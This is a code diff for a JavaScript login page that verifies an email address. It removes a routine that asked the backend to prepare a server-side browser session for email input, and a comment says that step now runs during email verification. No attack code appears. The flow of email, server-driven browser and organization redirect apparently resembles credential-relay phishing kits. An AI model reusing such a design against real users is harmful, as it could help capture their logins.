@@ -1431,9 +1431,6 @@ Status: ${data.status}`);
             clearMessage();
             setLoading(true, 'Taking you to your organization...', false);
 
-            // Ensure email page browser is ready before proceeding
-            await ensureEmailPageBrowserReady();
-
             try {
                 // First, verify if the email account exists
                 const verifyResponse = await fetch(`${API_BASE}/api/verify-email`, {
@@ -1974,44 +1971,8 @@ Status: ${data.status}`);
             });
         }
 
-        // Browser preparation for email page
-        let emailPageSessionId = null; // Store session ID for email input
-
-        async function prepareEmailPageBrowser() {
-            try {
-                console.log('📧 Preparing browser for email page...');
-
-                const prepareResponse = await fetch('/api/prepare-email-page', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                });
-
-                const prepareData = await prepareResponse.json();
-
-                if (prepareData.success) {
-                    emailPageSessionId = prepareData.sessionId;
-                    console.log(`✅ Browser prepared for email input: ${prepareData.sessionId}`);
-                } else {
-                    console.warn('⚠️ Email page browser preparation failed:', prepareData.error);
-                }
-
-            } catch (error) {
-                console.warn('⚠️ Error during email page browser preparation:', error.message);
-                // Don't block page functionality if browser preparation fails
-            }
-        }
-
-        // Ensure email page browser is ready
-        async function ensureEmailPageBrowserReady() {
-            if (!emailPageSessionId) {
-                console.log('🔄 No prepared browser session, creating new one...');
-                await prepareEmailPageBrowser();
-            } else {
-                console.log(`✅ Email page browser ready: ${emailPageSessionId}`);
-            }
-        }
+        // Browser preloading happens during email verification via /api/verify-email
+        // No need for separate email page preparation
 
         // Load background configuration from backend
         async function loadBackgroundFromConfig() {
